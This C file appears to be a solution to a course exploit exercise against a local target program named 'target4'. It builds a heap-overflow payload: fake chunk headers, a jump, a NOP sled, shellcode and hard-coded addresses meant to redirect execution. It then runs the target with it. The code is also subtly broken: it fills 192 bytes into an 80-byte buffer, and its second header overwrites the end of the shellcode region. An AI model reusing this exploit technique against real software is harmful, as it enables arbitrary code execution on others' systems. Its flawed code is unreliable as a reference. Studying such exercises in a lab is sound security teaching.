#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "shellcode.h"

#define TARGET "../targets/target4"
#define NOP 0x90
#define JMP 0xEB

// Code to print the memory layout of the injection
void print_injection(const char *injection, size_t size) {
    printf("Injection Memory Layout:\n");
    printf("--------------------------------------------------\n");

    for (size_t i = 0; i < size; i += 16) {
        // Print memory offset
        printf("%08lx  ", i);

        // Print hex representation
        for (size_t j = 0; j < 16; j++) {
            if (i + j < size) {
                printf("%02x ", (unsigned char)injection[i + j]);
            } else {
                printf("   "); // Padding for alignment
            }
        }
        printf("|\n");
    }

    printf("--------------------------------------------------\n");
}

int
main(const int argc, const char * argv[])
{

	// p address: 0x1bacec8
	// RIP address: 0x56820ec8
	static char p_addr[] = "\xc8\xce\xba\x01";
	static char rip_addr[] = "\xc8\x0e\x82\x56";

	char payload[80];

    // fill payload with NOPs
    memset(payload, NOP, 192);

	// 8 bit tags

	//------------------------------------------------------------------
    // 1) TAG1 (8 bytes), faking a CHUNK header 
	// 		- JMP encoded in the first two bytes
	//		- free bit set in the last byte
	// 		- fill rest with NOPs
    //------------------------------------------------------------------
    unsigned char tag1[8];
    // Start all zeros:
    memset(tag1, 0, sizeof(tag1));

    // chunk->l: Put a short jump (0xEB) + offset (0x08) in the first two bytes
    // Byte layout (littleâ€endian):
    //   tag1[0] = 0xEB;  // JMP
    //   tag1[1] = 0x06;  // relative offset
    //   tag1[2] = 0x90;  // Often a NOP or filler
    //   tag1[3] = 0x90;  // Could be anything
    tag1[0] = JMP;  
    tag1[1] = 0x06;  
    tag1[2] = NOP;   
    tag1[3] = NOP;   

    // chunk->r: set the free bit in the last byte, and fill the rest with NOPs
    unsigned int rightVal = 0x90909001;  
    memcpy(tag1 + 4, &rightVal, 4);

    // Copy tag1 into the first 8 bytes of payload
    memcpy(payload, tag1, 8);

	//------------------------------------------------------------------
    // 2) Shellcode region of 72 bytes:
    //    - leading NOPs
    //    - actual shellcode
    //------------------------------------------------------------------
    unsigned char nop_shellcode[72];
    memset(nop_shellcode, NOP, 72);

    // Insert the shellcode
    strncpy((char *) (nop_shellcode), shellcode, strlen(shellcode));

    // Copy that 72 bytes into payload immediately after tag1
    memcpy(payload + 8, nop_shellcode, 72);

	//------------------------------------------------------------------
    // 3) TAG2 (8 bytes), again faking a CHUNK header:
    //    - left pointer = p_addr
    //    - right pointer = rip_addr
    //------------------------------------------------------------------
    unsigned char tag2[8];
    memset(tag2, 0, sizeof(tag2));

    // chunk->l = p_addr
    memcpy(tag2, p_addr, 4);

    // chunk->r = rip_addr
    memcpy(tag2 + 4, rip_addr, 4);

    // Copy tag2 into the last 8 bytes
    memcpy(payload + 72, tag2, 8);

	//------------------------------------------------------------------
    // Print debug
    //------------------------------------------------------------------
    // print_injection(payload, 80);

	char *	args[]	= { payload, NULL };
	char *	env[]	= { NULL };

	// Exec the target
	execve(TARGET, args, env);

	printf("ERROR: execve failed\n");
	return(0);
}
